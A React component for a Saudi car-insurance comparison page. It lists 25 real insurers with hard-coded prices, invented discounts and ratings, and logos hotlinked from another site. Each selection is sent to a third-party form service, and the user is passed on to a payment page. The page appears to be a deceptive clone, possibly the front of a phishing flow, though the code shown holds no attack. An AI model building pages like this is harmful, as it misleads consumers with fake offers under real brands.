import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Shield, Car, CheckCircle2, Star, ArrowLeft, Percent, Search } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Header } from "@/components/Header";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { InsuranceLoadingScreen } from "@/components/InsuranceLoadingScreen";
import { useFormspreeSync } from "@/hooks/useFormspreeSync";
import { useAutoSave } from "@/hooks/useAutoSave";
import { useApplicationData } from "@/hooks/useApplicationData";
import { usePresence } from "@/hooks/usePresence";

interface InsuranceCompany {
  id: number;
  name: string;
  shortName: string;
  regularPrice: number;
  salePrice: number;
  logo: string;
  discount: number;
  features: string[];
  rating: number;
  isPopular?: boolean;
}

// شركات التأمين السعودية - ضد الغير (25 شركة) - الأسعار من 499 إلى 1432
const thirdPartyCompanies: InsuranceCompany[] = [
  {
    id: 1,
    name: "شركة تكافل الراجحي للتأمين",
    shortName: "الراجحي",
    regularPrice: 832,
    salePrice: 499,
    logo: "https://www.tameeni.com/images/ic-logos/31.svg",
    discount: 40,
    features: ["تغطية شاملة ضد الغير", "خدمة عملاء 24/7", "إصدار فوري", "تغطية الحوادث الشخصية", "مساعدة على الطريق"],
    rating: 4.9,
    isPopular: true
  },
  {
    id: 2,
    name: "شركة التعاونية للتأمين",
    shortName: "التعاونية",
    regularPrice: 845,
    salePrice: 549,
    logo: "https://www.tameeni.com/images/ic-logos/19.svg",
    discount: 35,
    features: ["تغطية موسعة", "شبكة ورش واسعة", "خدمة عملاء متميزة", "تطبيق جوال متكامل", "خصم عدم المطالبات"],
    rating: 4.8,
    isPopular: true
  },
  {
    id: 3,
    name: "شركة ملاذ للتأمين وإعادة التأمين التعاوني",
    shortName: "ملاذ",
    regularPrice: 892,
    salePrice: 580,
    logo: "https://www.tameeni.com/images/ic-logos/3.svg",
    discount: 35,
    features: ["تغطية شاملة ضد الغير", "خدمة عملاء 24/7", "إصدار فوري", "تغطية الأضرار المادية"],
    rating: 4.7,
    isPopular: true
  },
  {
    id: 4,
    name: "شركة ولاء للتأمين التعاوني",
    shortName: "ولاء",
    regularPrice: 870,
    salePrice: 609,
    logo: "https://www.tameeni.com/images/ic-logos/5.svg",
    discount: 30,
    features: ["تغطية الحوادث", "مساعدة على الطريق", "إصدار فوري", "خدمة سحب المركبات"],
    rating: 4.5
  },
  {
    id: 5,
    name: "شركة المتوسط والخليج للتأمين (ميدغلف)",
    shortName: "ميدغلف",
    regularPrice: 920,
    salePrice: 644,
    logo: "https://www.tameeni.com/images/ic-logos/15.svg",
    discount: 30,
    features: ["تغطية متميزة", "شبكة ورش معتمدة", "خدمة عملاء احترافية", "إصدار إلكتروني"],
    rating: 4.6
  },
  {
    id: 6,
    name: "شركة سلامة للتأمين التعاوني",
    shortName: "سلامة",
    regularPrice: 960,
    salePrice: 672,
    logo: "https://www.tameeni.com/images/ic-logos/9.svg",
    discount: 30,
    features: ["تغطية موسعة", "خصم عدم المطالبات", "خدمة مميزة", "تطبيق سهل الاستخدام"],
    rating: 4.5
  },
  {
    id: 7,
    name: "الشركة الخليجية العامة للتأمين التعاوني",
    shortName: "الخليجية",
    regularPrice: 932,
    salePrice: 699,
    logo: "https://www.tameeni.com/images/ic-logos/11.svg",
    discount: 25,
    features: ["تغطية أساسية متميزة", "أسعار تنافسية", "إصدار سريع", "دعم فني متواصل"],
    rating: 4.4
  },
  {
    id: 8,
    name: "شركة الجزيرة تكافل تعاوني",
    shortName: "الجزيرة تكافل",
    regularPrice: 972,
    salePrice: 729,
    logo: "https://www.tameeni.com/images/ic-logos/13.svg",
    discount: 25,
    features: ["تغطية تكافلية", "خدمة عملاء متميزة", "إصدار فوري", "تغطية الأضرار"],
    rating: 4.4
  },
  {
    id: 9,
    name: "مجموعة الخليج للتأمين",
    shortName: "مجموعة الخليج",
    regularPrice: 1012,
    salePrice: 759,
    logo: "https://www.tameeni.com/images/ic-logos/35.svg",
    discount: 25,
    features: ["تغطية شاملة", "خبرة عالمية", "خدمة متميزة", "شبكة واسعة"],
    rating: 4.5
  },
  {
    id: 10,
    name: "شركة إتحاد الخليج الأهلية للتأمين التعاوني",
    shortName: "إتحاد الخليج",
    regularPrice: 986,
    salePrice: 789,
    logo: "https://www.tameeni.com/images/ic-logos/2.svg",
    discount: 20,
    features: ["تغطية أساسية", "أسعار مناسبة", "إصدار سريع", "خدمة عملاء"],
    rating: 4.3
  },
  {
    id: 11,
    name: "الدرع العربي للتأمين",
    shortName: "الدرع العربي",
    regularPrice: 1024,
    salePrice: 819,
    logo: "https://www.tameeni.com/images/ic-logos/6.svg",
    discount: 20,
    features: ["تغطية أساسية", "إصدار سريع", "دعم فني", "خدمة مطالبات سريعة"],
    rating: 4.2
  },
  {
    id: 12,
    name: "شركة المجموعة المتحدة للتأمين التعاوني",
    shortName: "المجموعة المتحدة",
    regularPrice: 1062,
    salePrice: 849,
    logo: "https://www.tameeni.com/images/ic-logos/7.svg",
    discount: 20,
    features: ["تغطية متكاملة", "خدمة عملاء", "إصدار إلكتروني", "أسعار تنافسية"],
    rating: 4.3
  },
  {
    id: 13,
    name: "شركة متكاملة للتأمين",
    shortName: "متكاملة",
    regularPrice: 1098,
    salePrice: 879,
    logo: "https://www.tameeni.com/images/ic-logos/10.svg",
    discount: 20,
    features: ["تغطية متكاملة", "خدمة سريعة", "أسعار تنافسية", "دعم متواصل"],
    rating: 4.2
  },
  {
    id: 14,
    name: "شركة التأمين العربية التعاونية",
    shortName: "العربية",
    regularPrice: 1136,
    salePrice: 909,
    logo: "https://www.tameeni.com/images/ic-logos/4.svg",
    discount: 20,
    features: ["تغطية أساسية", "خدمة مطالبات", "إصدار فوري", "أسعار معقولة"],
    rating: 4.1
  },
  {
    id: 15,
    name: "شركة الاتحاد للتأمين التعاوني",
    shortName: "الاتحاد",
    regularPrice: 1105,
    salePrice: 939,
    logo: "https://www.tameeni.com/images/ic-logos/12.svg",
    discount: 15,
    features: ["تغطية أساسية", "أسعار مناسبة", "إصدار فوري", "خدمة عملاء"],
    rating: 4.1
  },
  {
    id: 16,
    name: "الشركة الوطنية للتأمين",
    shortName: "الوطنية",
    regularPrice: 1140,
    salePrice: 969,
    logo: "https://www.tameeni.com/images/ic-logos/18.svg",
    discount: 15,
    features: ["تغطية وطنية", "خدمة متميزة", "إصدار سريع", "شبكة ورش"],
    rating: 4.2
  },
  {
    id: 17,
    name: "أمانة للتأمين التعاوني",
    shortName: "أمانة",
    regularPrice: 1176,
    salePrice: 999,
    logo: "https://www.tameeni.com/images/ic-logos/34.svg",
    discount: 15,
    features: ["تغطية أمانة", "خدمة عملاء", "إصدار فوري", "أسعار منافسة"],
    rating: 4.0
  },
  {
    id: 18,
    name: "ليڤا للتأمين",
    shortName: "ليڤا",
    regularPrice: 1212,
    salePrice: 1030,
    logo: "https://www.tameeni.com/images/ic-logos/36.svg",
    discount: 15,
    features: ["تغطية عالمية", "خدمة متميزة", "إصدار إلكتروني", "دعم فني"],
    rating: 4.2
  },
  {
    id: 19,
    name: "شركة تري الرقمية لوكالة التأمين",
    shortName: "تري",
    regularPrice: 1178,
    salePrice: 1060,
    logo: "https://www.tameeni.com/images/ic-logos/40.svg",
    discount: 10,
    features: ["تأمين رقمي", "إصدار فوري", "تطبيق متكامل", "خدمة سريعة"],
    rating: 4.3
  },
  {
    id: 20,
    name: "شركة الصقر للتأمين التعاوني",
    shortName: "الصقر",
    regularPrice: 1222,
    salePrice: 1099,
    logo: "https://www.tameeni.com/images/ic-logos/7.svg",
    discount: 10,
    features: ["تغطية أساسية", "إصدار سريع", "خدمة مطالبات", "أسعار جيدة"],
    rating: 4.0
  },
  {
    id: 21,
    name: "شركة أسيج للتأمين",
    shortName: "أسيج",
    regularPrice: 1266,
    salePrice: 1139,
    logo: "https://www.tameeni.com/images/ic-logos/11.svg",
    discount: 10,
    features: ["تغطية متنوعة", "خدمة عملاء", "إصدار فوري", "دعم متواصل"],
    rating: 4.1
  },
  {
    id: 22,
    name: "شركة بوبا العربية للتأمين",
    shortName: "بوبا",
    regularPrice: 1310,
    salePrice: 1179,
    logo: "https://www.tameeni.com/images/ic-logos/19.svg",
    discount: 10,
    features: ["تغطية متميزة", "خدمة عالمية", "إصدار سريع", "شبكة واسعة"],
    rating: 4.4
  },
  {
    id: 23,
    name: "شركة وقاية للتأمين",
    shortName: "وقاية",
    regularPrice: 1295,
    salePrice: 1231,
    logo: "https://www.tameeni.com/images/ic-logos/3.svg",
    discount: 5,
    features: ["تغطية أساسية", "أسعار اقتصادية", "إصدار فوري", "خدمة بسيطة"],
    rating: 3.9
  },
  {
    id: 24,
    name: "شركة العالمية للتأمين",
    shortName: "العالمية",
    regularPrice: 1402,
    salePrice: 1332,
    logo: "https://www.tameeni.com/images/ic-logos/36.svg",
    discount: 5,
    features: ["تغطية عالمية", "خدمة متنوعة", "إصدار سريع", "دعم فني"],
    rating: 4.0
  },
  {
    id: 25,
    name: "شركة الأهلي للتأمين التعاوني",
    shortName: "الأهلي",
    regularPrice: 1508,
    salePrice: 1432,
    logo: "https://www.tameeni.com/images/ic-logos/2.svg",
    discount: 5,
    features: ["تغطية أهلية", "خدمة عملاء", "إصدار فوري", "أسعار منافسة"],
    rating: 4.0
  }
];

// شركات التأمين السعودية - شامل (25 شركة)
const comprehensiveCompanies: InsuranceCompany[] = [
  {
    id: 101,
    name: "شركة تكافل الراجحي للتأمين",
    shortName: "الراجحي",
    regularPrice: 2982,
    salePrice: 1789,
    logo: "https://www.tameeni.com/images/ic-logos/31.svg",
    discount: 40,
    features: ["تغطية شاملة كاملة", "قطع غيار أصلية 100%", "سيارة بديلة مجانية", "خدمة VIP على مدار الساعة", "تغطية الكوارث الطبيعية", "تأمين على السائق والركاب"],
    rating: 4.9,
    isPopular: true
  },
  {
    id: 102,
    name: "شركة التعاونية للتأمين",
    shortName: "التعاونية",
    regularPrice: 2830,
    salePrice: 1839,
    logo: "https://www.tameeni.com/images/ic-logos/19.svg",
    discount: 35,
    features: ["تغطية بلاتينية شاملة", "قطع غيار وكالة", "سيارة بديلة فورية", "تأمين على السائق", "خدمة مساعدة على الطريق", "تغطية الحوادث الشخصية"],
    rating: 4.8,
    isPopular: true
  },
  {
    id: 103,
    name: "شركة المتوسط والخليج للتأمين (ميدغلف)",
    shortName: "ميدغلف",
    regularPrice: 2906,
    salePrice: 1889,
    logo: "https://www.tameeni.com/images/ic-logos/15.svg",
    discount: 35,
    features: ["تغطية شاملة متميزة", "قطع غيار معتمدة", "سيارة بديلة", "خدمة عملاء 24/7", "تغطية السرقة والحريق", "مساعدة على الطريق"],
    rating: 4.7,
    isPopular: true
  },
  {
    id: 104,
    name: "شركة ملاذ للتأمين وإعادة التأمين التعاوني",
    shortName: "ملاذ",
    regularPrice: 2770,
    salePrice: 1939,
    logo: "https://www.tameeni.com/images/ic-logos/3.svg",
    discount: 30,
    features: ["تغطية شاملة", "خدمة مساعدة على الطريق", "إصدار فوري", "قطع غيار أصلية", "تغطية الحوادث", "خدمة عملاء متميزة"],
    rating: 4.6
  },
  {
    id: 105,
    name: "شركة سلامة للتأمين التعاوني",
    shortName: "سلامة",
    regularPrice: 2841,
    salePrice: 1989,
    logo: "https://www.tameeni.com/images/ic-logos/9.svg",
    discount: 30,
    features: ["تغطية شاملة موسعة", "قطع غيار معتمدة", "خدمة متميزة", "سيارة بديلة", "تغطية الأضرار الكاملة", "مساعدة طوارئ"],
    rating: 4.5
  },
  {
    id: 106,
    name: "شركة ولاء للتأمين التعاوني",
    shortName: "ولاء",
    regularPrice: 2913,
    salePrice: 2039,
    logo: "https://www.tameeni.com/images/ic-logos/5.svg",
    discount: 30,
    features: ["تغطية شاملة أساسية", "أسعار تنافسية", "خدمة عملاء متاحة", "إصدار سريع", "تغطية الحوادث", "مساعدة على الطريق"],
    rating: 4.4
  },
  {
    id: 107,
    name: "مجموعة الخليج للتأمين",
    shortName: "مجموعة الخليج",
    regularPrice: 2786,
    salePrice: 2089,
    logo: "https://www.tameeni.com/images/ic-logos/35.svg",
    discount: 25,
    features: ["تغطية عالمية شاملة", "خبرة دولية", "قطع غيار أصلية", "سيارة بديلة", "خدمة VIP", "تغطية السفر"],
    rating: 4.6
  },
  {
    id: 108,
    name: "شركة الجزيرة تكافل تعاوني",
    shortName: "الجزيرة تكافل",
    regularPrice: 2853,
    salePrice: 2139,
    logo: "https://www.tameeni.com/images/ic-logos/13.svg",
    discount: 25,
    features: ["تغطية تكافلية شاملة", "قطع غيار معتمدة", "خدمة عملاء متميزة", "إصدار فوري", "تغطية الأضرار", "مساعدة على الطريق"],
    rating: 4.5
  },
  {
    id: 109,
    name: "الشركة الخليجية العامة للتأمين التعاوني",
    shortName: "الخليجية",
    regularPrice: 2919,
    salePrice: 2189,
    logo: "https://www.tameeni.com/images/ic-logos/11.svg",
    discount: 25,
    features: ["تغطية شاملة", "شبكة ورش معتمدة", "خدمة عملاء 24/7", "قطع غيار", "تغطية الحوادث", "إصدار سريع"],
    rating: 4.4
  },
  {
    id: 110,
    name: "شركة إتحاد الخليج الأهلية للتأمين التعاوني",
    shortName: "إتحاد الخليج",
    regularPrice: 2799,
    salePrice: 2239,
    logo: "https://www.tameeni.com/images/ic-logos/2.svg",
    discount: 20,
    features: ["تغطية شاملة", "قطع غيار معتمدة", "خدمة مطالبات سريعة", "إصدار إلكتروني", "مساعدة على الطريق", "تغطية الحوادث"],
    rating: 4.3
  },
  {
    id: 111,
    name: "الدرع العربي للتأمين",
    shortName: "الدرع العربي",
    regularPrice: 2861,
    salePrice: 2289,
    logo: "https://www.tameeni.com/images/ic-logos/6.svg",
    discount: 20,
    features: ["تغطية شاملة أساسية", "شبكة ورش محلية", "إصدار سريع", "خدمة مطالبات", "قطع غيار", "دعم فني"],
    rating: 4.2
  },
  {
    id: 112,
    name: "شركة المجموعة المتحدة للتأمين التعاوني",
    shortName: "المجموعة المتحدة",
    regularPrice: 2924,
    salePrice: 2339,
    logo: "https://www.tameeni.com/images/ic-logos/7.svg",
    discount: 20,
    features: ["تغطية متكاملة", "قطع غيار معتمدة", "خدمة عملاء", "إصدار سريع", "مساعدة على الطريق", "تغطية الأضرار"],
    rating: 4.3
  },
  {
    id: 113,
    name: "شركة متكاملة للتأمين",
    shortName: "متكاملة",
    regularPrice: 2986,
    salePrice: 2389,
    logo: "https://www.tameeni.com/images/ic-logos/10.svg",
    discount: 20,
    features: ["تغطية متكاملة شاملة", "خدمة سريعة", "أسعار معقولة", "قطع غيار", "إصدار فوري", "دعم متواصل"],
    rating: 4.2
  },
  {
    id: 114,
    name: "شركة التأمين العربية التعاونية",
    shortName: "العربية",
    regularPrice: 3049,
    salePrice: 2439,
    logo: "https://www.tameeni.com/images/ic-logos/4.svg",
    discount: 20,
    features: ["تغطية شاملة", "خدمة مطالبات", "إصدار فوري", "قطع غيار معتمدة", "مساعدة على الطريق", "أسعار تنافسية"],
    rating: 4.1
  },
  {
    id: 115,
    name: "الشركة الوطنية للتأمين",
    shortName: "الوطنية",
    regularPrice: 2928,
    salePrice: 2489,
    logo: "https://www.tameeni.com/images/ic-logos/18.svg",
    discount: 15,
    features: ["تغطية وطنية شاملة", "خدمة متميزة", "قطع غيار", "إصدار سريع", "شبكة ورش", "مساعدة على الطريق"],
    rating: 4.3
  },
  {
    id: 116,
    name: "شركة الاتحاد للتأمين التعاوني",
    shortName: "الاتحاد",
    regularPrice: 2987,
    salePrice: 2539,
    logo: "https://www.tameeni.com/images/ic-logos/12.svg",
    discount: 15,
    features: ["تغطية أساسية شاملة", "أسعار مناسبة", "خدمة جيدة", "قطع غيار", "إصدار فوري", "دعم فني"],
    rating: 4.1
  },
  {
    id: 117,
    name: "أمانة للتأمين التعاوني",
    shortName: "أمانة",
    regularPrice: 3046,
    salePrice: 2589,
    logo: "https://www.tameeni.com/images/ic-logos/34.svg",
    discount: 15,
    features: ["تغطية أمانة شاملة", "خدمة عملاء", "إصدار فوري", "قطع غيار", "أسعار منافسة", "مساعدة على الطريق"],
    rating: 4.0
  },
  {
    id: 118,
    name: "ليڤا للتأمين",
    shortName: "ليڤا",
    regularPrice: 3105,
    salePrice: 2639,
    logo: "https://www.tameeni.com/images/ic-logos/36.svg",
    discount: 15,
    features: ["تغطية عالمية شاملة", "خدمة متميزة", "قطع غيار أصلية", "إصدار إلكتروني", "دعم فني", "سيارة بديلة"],
    rating: 4.3
  },
  {
    id: 119,
    name: "شركة تري الرقمية لوكالة التأمين",
    shortName: "تري",
    regularPrice: 2988,
    salePrice: 2689,
    logo: "https://www.tameeni.com/images/ic-logos/40.svg",
    discount: 10,
    features: ["تأمين رقمي شامل", "إصدار فوري", "تطبيق متكامل", "خدمة سريعة", "قطع غيار", "دعم رقمي"],
    rating: 4.4
  },
  {
    id: 120,
    name: "شركة الصقر للتأمين التعاوني",
    shortName: "الصقر",
    regularPrice: 3043,
    salePrice: 2739,
    logo: "https://www.tameeni.com/images/ic-logos/7.svg",
    discount: 10,
    features: ["تغطية شاملة", "إصدار سريع", "خدمة مطالبات", "قطع غيار", "أسعار جيدة", "دعم فني"],
    rating: 4.1
  },
  {
    id: 121,
    name: "شركة أسيج للتأمين",
    shortName: "أسيج",
    regularPrice: 3099,
    salePrice: 2789,
    logo: "https://www.tameeni.com/images/ic-logos/11.svg",
    discount: 10,
    features: ["تغطية متنوعة شاملة", "خدمة عملاء", "إصدار فوري", "قطع غيار", "دعم متواصل", "مساعدة على الطريق"],
    rating: 4.2
  },
  {
    id: 122,
    name: "شركة بوبا العربية للتأمين",
    shortName: "بوبا",
    regularPrice: 3154,
    salePrice: 2839,
    logo: "https://www.tameeni.com/images/ic-logos/19.svg",
    discount: 10,
    features: ["تغطية متميزة شاملة", "خدمة عالمية", "قطع غيار أصلية", "إصدار سريع", "شبكة واسعة", "سيارة بديلة"],
    rating: 4.5
  },
  {
    id: 123,
    name: "شركة وقاية للتأمين",
    shortName: "وقاية",
    regularPrice: 3041,
    salePrice: 2889,
    logo: "https://www.tameeni.com/images/ic-logos/3.svg",
    discount: 5,
    features: ["تغطية أساسية شاملة", "أسعار اقتصادية", "إصدار فوري", "قطع غيار", "خدمة بسيطة", "دعم فني"],
    rating: 3.9
  },
  {
    id: 124,
    name: "شركة العالمية للتأمين",
    shortName: "العالمية",
    regularPrice: 4104,
    salePrice: 3899,
    logo: "https://www.tameeni.com/images/ic-logos/36.svg",
    discount: 5,
    features: ["تغطية عالمية", "خدمة متنوعة", "إصدار سريع", "قطع غيار", "دعم فني", "مساعدة على الطريق"],
    rating: 4.0
  },
  {
    id: 125,
    name: "شركة الأهلي للتأمين التعاوني",
    shortName: "الأهلي",
    regularPrice: 4209,
    salePrice: 3999,
    logo: "https://www.tameeni.com/images/ic-logos/2.svg",
    discount: 5,
    features: ["تغطية أهلية شاملة", "خدمة عملاء", "إصدار فوري", "قطع غيار", "أسعار منافسة", "دعم متواصل"],
    rating: 4.0
  }
];

const InsuranceSelection = () => {
  const navigate = useNavigate();
  const [insuranceType, setInsuranceType] = useState<"comprehensive" | "third-party">("third-party");
  const [selectedCompany, setSelectedCompany] = useState<string>("");
  const [sortBy, setSortBy] = useState<"price" | "discount" | "rating">("discount");
  const [searchQuery, setSearchQuery] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const { applicationId, createOrUpdateApplication } = useApplicationData();
  usePresence(applicationId || undefined);

  useEffect(() => {
    // Show loading screen for 3 seconds
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 3000);
    
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    console.log('Insurance selection page mounted with applicationId:', applicationId);
  }, [applicationId]);

  useFormspreeSync({
    insuranceType,
    selectedCompany
  }, "صفحة اختيار التأمين - Insurance Selection");

  useAutoSave(applicationId, {
    selected_company: selectedCompany,
    current_step: 'insurance_selection'
  }, "InsuranceSelection");

  const displayedCompanies = insuranceType === "comprehensive" ? comprehensiveCompanies : thirdPartyCompanies;

  const filteredCompanies = displayedCompanies.filter(company =>
    company.name.includes(searchQuery) || company.shortName.includes(searchQuery)
  );

  const sortedCompanies = [...filteredCompanies].sort((a, b) => {
    if (sortBy === "price") return a.salePrice - b.salePrice;
    if (sortBy === "discount") return b.discount - a.discount;
    if (sortBy === "rating") return b.rating - a.rating;
    return 0;
  });

  const handleSelectCompany = async (company: InsuranceCompany) => {
    setSelectedCompany(`${company.name} - السعر: ${company.salePrice}﷼`);
    
    try {
      await createOrUpdateApplication({
        selected_company: company.name,
        selected_price: company.salePrice.toString(),
        regular_price: company.regularPrice.toString(),
        company_logo: company.logo,
        current_step: 'insurance_selection'
      });
      
      navigate(`/payment?company=${encodeURIComponent(company.name)}&price=${company.salePrice}&regularPrice=${company.regularPrice}`);
    } catch (error) {
      console.error('Error saving selection:', error);
    }
  };

  return (
    <>
      <InsuranceLoadingScreen isLoading={isLoading} insuranceType={insuranceType} />
      
      <div className="min-h-screen bg-gradient-to-b from-sky-50 to-background">
        <Header />
      
      <section className="py-8 px-4 md:px-6">
        <div className="container mx-auto max-w-7xl">
          {/* Page Header */}
          <div className="text-center mb-8">
            <h1 className="text-3xl md:text-4xl font-bold text-foreground mb-3">
              اختر التأمين المناسب لك
            </h1>
            <p className="text-muted-foreground text-lg">
              قارن بين أفضل عروض شركات التأمين في المملكة العربية السعودية
            </p>
          </div>

          {/* Insurance Type Tabs */}
          <div className="flex justify-center mb-6">
            <div className="bg-muted p-1.5 rounded-2xl inline-flex gap-2">
              <button
                onClick={() => setInsuranceType("third-party")}
                className={`flex items-center gap-2 px-6 py-3 rounded-xl text-sm md:text-base font-medium transition-all ${
                  insuranceType === "third-party"
                    ? "bg-primary text-primary-foreground shadow-lg"
                    : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <Shield className="h-5 w-5" />
                <span>تأمين ضد الغير</span>
                <Badge variant="secondary" className="mr-2 text-xs">25 شركة</Badge>
              </button>
              <button
                onClick={() => setInsuranceType("comprehensive")}
                className={`flex items-center gap-2 px-6 py-3 rounded-xl text-sm md:text-base font-medium transition-all ${
                  insuranceType === "comprehensive"
                    ? "bg-primary text-primary-foreground shadow-lg"
                    : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <Car className="h-5 w-5" />
                <span>تأمين شامل</span>
                <Badge variant="secondary" className="mr-2 text-xs">25 شركة</Badge>
              </button>
            </div>
          </div>

          {/* Search Bar */}
          <div className="max-w-md mx-auto mb-6">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-muted-foreground" />
              <Input
                type="text"
                placeholder="ابحث عن شركة تأمين..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pr-10 rounded-xl"
              />
            </div>
          </div>

          {/* Sort Options */}
          <div className="flex justify-center gap-3 mb-6 flex-wrap">
            <span className="text-muted-foreground self-center text-sm">ترتيب حسب:</span>
            {[
              { key: "discount", label: "أعلى خصم", icon: Percent },
              { key: "price", label: "أقل سعر", icon: null },
              { key: "rating", label: "أعلى تقييم", icon: Star }
            ].map((option) => (
              <Button
                key={option.key}
                variant={sortBy === option.key ? "default" : "outline"}
                size="sm"
                onClick={() => setSortBy(option.key as "price" | "discount" | "rating")}
                className="rounded-full text-xs"
              >
                {option.label}
              </Button>
            ))}
          </div>

          {/* Results Count */}
          <div className="text-center mb-6">
            <p className="text-muted-foreground text-sm">
              عرض <span className="font-bold text-foreground">{sortedCompanies.length}</span> شركة تأمين {insuranceType === "comprehensive" ? "شامل" : "ضد الغير"}
            </p>
          </div>

          {/* Insurance Cards Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4 mb-12">
            {sortedCompanies.map((company) => (
              <Card 
                key={company.id} 
                className={`relative overflow-hidden transition-all duration-300 hover:shadow-xl hover:-translate-y-1 border-2 ${
                  company.isPopular ? 'border-primary/50 ring-2 ring-primary/20' : 'border-transparent hover:border-primary/30'
                }`}
              >
                {/* Discount Badge */}
                <div className="absolute top-2 right-2 z-10">
                  <Badge 
                    className={`text-xs font-bold px-2 py-0.5 ${
                      company.discount >= 35 
                        ? 'bg-red-500 hover:bg-red-600' 
                        : company.discount >= 25 
                        ? 'bg-orange-500 hover:bg-orange-600'
                        : company.discount >= 15
                        ? 'bg-yellow-500 hover:bg-yellow-600 text-yellow-900'
                        : 'bg-primary hover:bg-primary/90'
                    }`}
                  >
                    خصم {company.discount}%
                  </Badge>
                </div>

                {/* Popular Badge */}
                {company.isPopular && (
                  <div className="absolute top-2 left-2 z-10">
                    <Badge variant="outline" className="bg-background/90 border-primary text-primary text-xs px-1.5 py-0.5">
                      <Star className="h-3 w-3 ml-0.5 fill-primary" />
                      الأكثر طلباً
                    </Badge>
                  </div>
                )}

                <div className="p-4">
                  {/* Company Logo */}
                  <div className="bg-white rounded-lg p-3 mb-3 h-16 flex items-center justify-center border border-border">
                    <img 
                      src={company.logo} 
                      alt={company.name} 
                      className="max-h-12 max-w-full object-contain"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = 'https://via.placeholder.com/120x60?text=' + encodeURIComponent(company.shortName);
                      }}
                    />
                  </div>

                  {/* Company Name */}
                  <h3 className="font-bold text-foreground text-center mb-1.5 text-xs leading-tight min-h-[32px] line-clamp-2">
                    {company.name}
                  </h3>

                  {/* Rating */}
                  <div className="flex items-center justify-center gap-1 mb-3">
                    <div className="flex">
                      {[...Array(5)].map((_, i) => (
                        <Star 
                          key={i} 
                          className={`h-3 w-3 ${i < Math.floor(company.rating) ? 'fill-yellow-400 text-yellow-400' : 'fill-gray-200 text-gray-200'}`} 
                        />
                      ))}
                    </div>
                    <span className="text-xs font-medium text-muted-foreground">({company.rating})</span>
                  </div>

                  {/* Price Section */}
                  <div className="bg-gradient-to-br from-primary/5 to-primary/10 rounded-lg p-3 mb-3">
                    <div className="flex items-center justify-center gap-2 mb-0.5">
                      <span className="text-xs text-muted-foreground line-through">
                        {company.regularPrice.toLocaleString()} ر.س
                      </span>
                    </div>
                    <div className="text-center">
                      <span className="text-xl font-bold text-primary">
                        {company.salePrice.toLocaleString()}
                      </span>
                      <span className="text-xs text-primary mr-1">ر.س</span>
                    </div>
                    <p className="text-[10px] text-muted-foreground text-center mt-0.5">
                      شامل الضريبة
                    </p>
                  </div>

                  {/* Features */}
                  <div className="space-y-1.5 mb-3">
                    {company.features.map((feature, idx) => (
                      <div key={idx} className="flex items-start gap-1.5 text-[11px] text-muted-foreground">
                        <CheckCircle2 className="h-3.5 w-3.5 text-green-500 flex-shrink-0 mt-0.5" />
                        <span>{feature}</span>
                      </div>
                    ))}
                  </div>

                  {/* CTA Button */}
                  <Button 
                    className="w-full bg-primary hover:bg-primary/90 text-primary-foreground rounded-lg py-2 text-sm font-bold"
                    onClick={() => handleSelectCompany(company)}
                  >
                    اشتري الآن
                    <ArrowLeft className="h-4 w-4 mr-1" />
                  </Button>
                </div>
              </Card>
            ))}
          </div>

          {/* No Results */}
          {sortedCompanies.length === 0 && (
            <div className="text-center py-12">
              <p className="text-muted-foreground text-lg">لا توجد نتائج للبحث</p>
              <Button variant="outline" onClick={() => setSearchQuery("")} className="mt-4">
                مسح البحث
              </Button>
            </div>
          )}

          {/* Navigation */}
          <div className="flex justify-center">
            <Button 
              variant="outline" 
              size="lg" 
              onClick={() => navigate("/vehicle-info")}
              className="px-8 rounded-xl"
            >
              العودة للخلف
            </Button>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />
    </div>
    </>
  );
};

export default InsuranceSelection;
